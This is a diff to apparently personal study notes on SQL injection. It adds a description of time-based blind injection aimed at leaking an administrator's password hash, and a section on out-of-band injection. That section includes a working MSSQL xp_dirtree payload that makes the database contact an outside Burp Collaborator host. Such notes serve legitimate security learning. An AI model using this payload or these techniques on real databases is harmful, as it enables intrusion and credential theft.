@@ -223,8 +223,24 @@ requests and observing the behavior of the DB server.
     the administrator's password!!
 
     \* Python script to automate this "brute force" search.
+    Burp Intruder tool.
 
-    2.2 **Time-Based**:  (TO DO)
+    2.2 **Time-Based**:  
+    A blind SQL injection technique that relies on the
+    database **pausing** for a specified amount of time,
+    and then returning the results, indicating a successful
+    SQL query exeuction.
+    
+    <u>Example query</u>: if the first character of the
+    administrator's hashed password is an 'a', wait for
+    10 seconds. 
 
+3. **Out-of-band (OAST)** (not common)
 
-3. **Out-of-band**  
+Vulnerability that consists of triggering an out-out-band
+network connection to a system that you control. 
+It relies on a variety of protocols, such as DNS and HTTP. 
+
+### Example Payload (out-of-band) STORED PROCEDURE
+
+`'; exec master..xp_dirtree '//0efdyfaksnakwjfbvijb3876.burpcollaborator.net/a'--`
